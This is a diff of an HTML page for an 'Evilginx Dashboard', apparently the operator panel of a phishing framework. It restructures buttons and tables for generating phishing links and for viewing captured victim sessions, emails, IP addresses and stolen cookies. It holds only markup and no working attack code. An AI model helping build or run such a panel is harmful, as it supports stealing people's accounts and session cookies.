@@ -3,38 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Evilginx Dashboard</title>
+    <title>Dashboard</title>
     <link rel="stylesheet" href="styles.css">
 </head>
-<body class="animated-dashboard">
-    <nav>
-        <h1>Dashboard</h1>
+<body>
+    <div class="dashboard-container">
+        <h1>Welcome to Evilginx Dashboard</h1>
         <button onclick="logout()">Logout</button>
-    </nav>
-    <div class="container">
-        <button onclick="generatePhishingLink()">Generate Link</button>
-        <div id="generatedLink"></div>
+        <button onclick="generateLink()">Generate Link</button>
+        <button onclick="fetchSessions()">View Captured Sessions</button>
+        <button onclick="fetchCookies()">View Cookies</button>
 
-        <h2>Captured Sessions</h2>
-        <table id="capturedSessions">
-            <tr>
-                <th>Email</th>
-                <th>IP Address</th>
-                <th>Time</th>
-                <th>Location</th>
-            </tr>
-        </table>
-
-        <h2>Cookies</h2>
-        <table id="cookiesTable">
-            <tr>
-                <th>Session ID</th>
-                <th>Cookie Data</th>
-            </tr>
-        </table>
+        <div id="data-output"></div>
     </div>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js"></script>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
+
     <script src="script.js"></script>
 </body>
 </html>
